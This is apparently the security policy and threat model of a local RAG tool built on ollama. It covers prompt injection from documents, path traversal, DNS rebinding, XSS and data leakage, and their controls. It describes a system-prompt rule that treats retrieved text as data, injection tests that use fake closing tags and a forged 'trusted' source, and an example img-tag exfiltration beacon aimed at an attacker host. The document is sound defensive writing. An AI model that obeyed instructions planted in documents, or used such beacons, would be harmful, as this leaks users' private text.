# Security

local-rag-ollama reads private documents, stores their full text in an index and shows
them in a browser. Other people install it and point it at their own folders. Design
goal: the text of your documents never leaves the machine, a hostile document can't take
over the model or the browser, and the ingest path can't be tricked into reading files
outside the folder you gave it.

## Reporting a vulnerability

Open a private security advisory at
<https://github.com/MartinCastroAlvarez/local-rag-ollama/security/advisories/new>.
Do **not** open a public issue for a suspected vulnerability. We acknowledge within 5
business days and aim to ship a fix within 30 days. You are credited in the advisory
unless you ask otherwise.

Supported versions: the latest minor release.

## 1. Threat model

**Assets.** The text of your documents (in files, in the index, in prompts), the questions
you ask, the local machine and filesystem, and the browser session on `127.0.0.1`.

**Actors.**

| Actor | Controls | Must not be able to |
| --- | --- | --- |
| A document author (anyone whose file lands in an ingested folder) | the text, markup, file names and links inside one document | give the model instructions, forge citations or sources, run script in the UI, make the app read other files |
| A web page open in your browser | requests to `localhost`, DNS rebinding | read the index or ask questions through the local UI |
| Another process or user on the network | TCP connections | reach the UI at all |
| The model | its answer text | cite sources that do not exist, inject HTML into the UI |
| Whoever controls `OLLAMA_HOST` | where embeddings and prompts are sent | receive your documents without your explicit opt-in |

**Threats and controls.**

| Threat | Control |
| --- | --- |
| Prompt injection from documents | Retrieved text is treated as untrusted. The system prompt, which comes before any source, says sources are data and never instructions. Each chunk is HTML-escaped (`& < > " '`), so a document can't close or open a tag, and is wrapped in a numbered `<source ... trust="untrusted">` element inside one `<sources>` block. The question comes after the block with a reminder. Tests feed a document that tries `</source></sources><system>…` and a fake `<source id="99" trust="trusted">`. Escaping reduces injection; it can't remove it. A model can still be persuaded by text it reads, so treat answers about untrusted corpora as untrusted too. |
| Forged citations | Citations are checked after generation: `[n]` must refer to a source that was actually given to the model. Others are removed from the answer and the citation list. |
| Path traversal and symlink escape on ingest | The root is resolved first. Directory symlinks are never followed. A file symlink is used only if its resolved target is inside the root. Files are opened with `O_NOFOLLOW` on the resolved path, so a symlink swapped in after discovery is refused. Hidden entries (`.git`, `.env`, `.ssh`) are skipped, and only regular files with an allowlisted suffix are read. Sources are stored relative to the root, never as `../…`. |
| Resource exhaustion on ingest | Per-file size limit (`LOCAL_RAG_MAX_FILE_BYTES`, 20 MiB by default; enforced on read too), at most 2000 PDF pages, encrypted PDFs skipped, parser errors reported per file instead of aborting. |
| Documents leaving the machine | `OLLAMA_HOST` must be a loopback address unless `LOCAL_RAG_ALLOW_REMOTE_OLLAMA=1`. URLs with credentials, queries or fragments are refused. The HTTP client never follows redirects and ignores proxy environment variables (`trust_env=False`). No other network call is made at query time. |
| Telemetry | None. The project sends no usage data, and the vector store (sqlite-vec) has no telemetry. Chroma and LanceDB, which do have telemetry switches, are not used. The optional fastembed path downloads ONNX weights from the Hugging Face Hub once. Before that, `HF_HUB_DISABLE_TELEMETRY=1` and `DO_NOT_TRACK=1` are set. A test scans the package for analytics SDKs. |
| Network exposure of the UI | `local-rag serve` refuses any host that isn't loopback (`127.0.0.1`, `::1`, `localhost`). The UI has no authentication by design, so it must never listen on a LAN address. |
| DNS rebinding and cross-site requests | `Host` must be `127.0.0.1`, `localhost` or `::1` (else 400). Any `Origin` that isn't this exact origin gets 403. No CORS headers are sent. Non-GET requests must be `application/json`, which a cross-site form can't send without a preflight. There is no endpoint that ingests or reads arbitrary paths. |
| XSS through document or model text | The page inserts all document and model text with `textContent`. A test bans `innerHTML`/`insertAdjacentHTML`/`eval` in the script. There is no inline script and no external asset. A strict CSP is set: `default-src 'none'; script-src 'self'; frame-ancestors 'none'`. Also `nosniff`, `no-referrer`, `X-Frame-Options: DENY`, and `no-store` on API responses. Answers are plain text, never rendered Markdown, so a document can't plant an `<img src=https://attacker/?q=…>` exfiltration beacon. |
| Index at rest | The SQLite index holds the full text of your documents. It is created `0600` inside a `0700` directory. All SQL is parameterised, and free text reaches FTS5 only as quoted tokens joined with `OR`, so FTS operators and column filters can't be injected. |
| Code execution | No `eval`, `exec`, `pickle`, `marshal`, `yaml` or `subprocess` in the package. An AST test enforces this, and also that no `noqa`/`nosec`/`type: ignore` hides a finding. |

## 2. Running it safely

- Ingest folders you'd be comfortable pasting into a chat with the model. Anything you
  ingest can end up in a prompt.
- Keep `OLLAMA_HOST` on loopback. If you opt into a remote ollama, use a host you
  control and put TLS in front of it.
- Don't expose `local-rag serve` through a reverse proxy or tunnel. It has no auth.
- Delete the index (`LOCAL_RAG_DB`) when you delete the documents. It holds a full copy.

## 3. What this project never does

- Call a hosted LLM or embedding API, or send any telemetry.
- Follow symlinks out of the ingest root, or read hidden files.
- Render model or document text as HTML.
- Listen on a non-loopback interface.
